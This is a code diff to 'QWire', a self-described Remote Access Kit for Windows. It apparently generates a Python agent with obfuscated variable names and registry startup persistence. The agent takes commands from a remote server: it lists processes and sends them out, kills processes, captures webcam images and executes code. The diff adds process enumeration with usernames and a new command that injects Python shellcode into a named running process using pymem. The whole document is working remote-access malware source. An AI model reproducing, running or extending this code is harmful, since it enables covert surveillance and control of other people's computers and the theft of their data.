@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.21
+# Build:  1.0.22
 # -------------------------------------------------------------
 from ..utils.encryption import Scrambler
 from core.logging.logging import LoggingUtilitys
@@ -138,10 +138,7 @@ class QWireAgent():
         code = Persistance().registry_start_up(
         function_name,CURRENT_DIR,persistence_option
         )
-        get_running_process = Scrambler().scrambleVar(self.variable_length)
-        com_output = Scrambler().scrambleVar(self.variable_length)
         extract_process_list = Scrambler().scrambleVar(self.variable_length)
-        process_list = Scrambler().scrambleVar(self.variable_length)
         output = Scrambler().scrambleVar(self.variable_length)
         pid = Scrambler().scrambleVar(self.variable_length)
         kill_task = Scrambler().scrambleVar(self.variable_length)
@@ -158,6 +155,13 @@ class QWireAgent():
         web_cam = Scrambler().scrambleVar(self.variable_length)
         stream_sock = Scrambler().scrambleVar(self.variable_length)
         img = Scrambler().scrambleVar(self.variable_length)
+        process_string = Scrambler().scrambleVar(self.variable_length)
+        process_name =Scrambler().scrambleVar(self.variable_length)
+        string = Scrambler().scrambleVar(self.variable_length)
+        username = Scrambler().scrambleVar(self.variable_length)
+        inject_python = Scrambler().scrambleVar(self.variable_length)
+        process = Scrambler().scrambleVar(self.variable_length)
+        inject_and_exec = Scrambler().scrambleVar(self.variable_length)
         agent_source = f"""
 import socket as socket
 import base64 as base64
@@ -168,9 +172,11 @@ import subprocess as subprocess
 import threading as threading
 import struct as struct
 import cv2
+import psutil
 from PIL import ImageGrab as ImageGrab
 from time import sleep as sleep
 from cryptography.fernet import Fernet
+from pymem import Pymem
 {SEP} = '<sep>'
 {BUFFER} = 4096
 {SERV_PORT} = {server_port}
@@ -192,11 +198,7 @@ class {Utilitys}:
         {command} = subprocess.Popen(['powershell', '(Get-WmiObject -class Win32_OperatingSystem).Version'],stdout=subprocess.PIPE)
         {version_output} = {command}.stdout.read().decode()  
         {version_output} = {version_output}.replace('\\n','')
-        return {version_output}.strip('\\r')
-    def {get_running_process}(self):
-        {command} = subprocess.Popen(['powershell', 'get-process'],stdout=subprocess.PIPE,shell=True)
-        {com_output} = {command}.stdout.read().decode()
-        return {com_output}                      
+        return {version_output}.strip('\\r')              
     def {get_local_ip}(self):
         {local_ip} = socket.gethostbyname(socket.gethostname()) 
         return {local_ip}                                       
@@ -233,8 +235,17 @@ class {SystemManager}:
     def {shutdown_computer}(self):
         subprocess.run('shutdown /p')
     def {extract_process_list}(self):
-        {process_list} = {Utilitys}().{get_running_process}()
-        {ExfilSocket}().{exfil_socket_send}({process_list})
+        {process_string} = ''
+        for {process} in psutil.process_iter():
+            {process_name} = {process}.name()
+            {pid} = {process}.pid
+            try:
+                {username} = {process}.username()
+            except psutil.AccessDenied:
+                {username} = 'NT AUTHORITY\SYSTEM'
+            {string} = f'{{{process_name}}}{{{SEP}}}{{str({pid})}}{{{SEP}}}{{{username}}}{{{SEP}}}\\n'
+            {process_string} += {string}
+        {ExfilSocket}().{exfil_socket_send}({process_string})  
     def {kill_task}(self,{pid}):
         {command} = subprocess.Popen(['taskkill','/pid',str({pid}),'/f'],stdout=subprocess.PIPE,shell=True)
         {output} = {command}.stdout.read().decode()
@@ -269,6 +280,7 @@ class {ClientSocket}:
         self.{process_manager} = 'proc_list'
         self.{term_process} = 'terminate'
         self.{snapshot} = 'snap_shot'
+        self.{inject_python} = 'inject_pie'
     def {connect_to_server}(self):
         {domain} = socket.gethostbyname(self.{dns_address})                  
         self.{client_socket} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       
@@ -344,7 +356,9 @@ class {ClientSocket}:
             if {action_flag} == self.{term_process}:                                      
                 {SystemManager}().{kill_task}({server_command}[1])
             if {action_flag} == self.{snapshot}:
-                {StreamSocket}().{webcam_snapshot}()                                 
+                {StreamSocket}().{webcam_snapshot}()
+            if {action_flag} == self.{inject_python}:
+                {CodeExecution}().{inject_and_exec}({server_command}[1],{server_command}[2])                              
     def {recv_all_data}(self):
         try:
             {bytes_data} = b''
@@ -436,6 +450,10 @@ class {CodeExecution}():
             except Exception as {error}:
                 pass
         {MultiProcessor}().{start_child_thread_arg}({exec_},{system_command})
+    def {inject_and_exec}(self,{process_name},{python_code}):
+        {process} = Pymem({process_name})
+        {process}.inject_python_interpreter()
+        {process}.inject_python_shellcode({python_code})
 {ClientSocket}().{connect_to_server}()
 """
         return agent_source
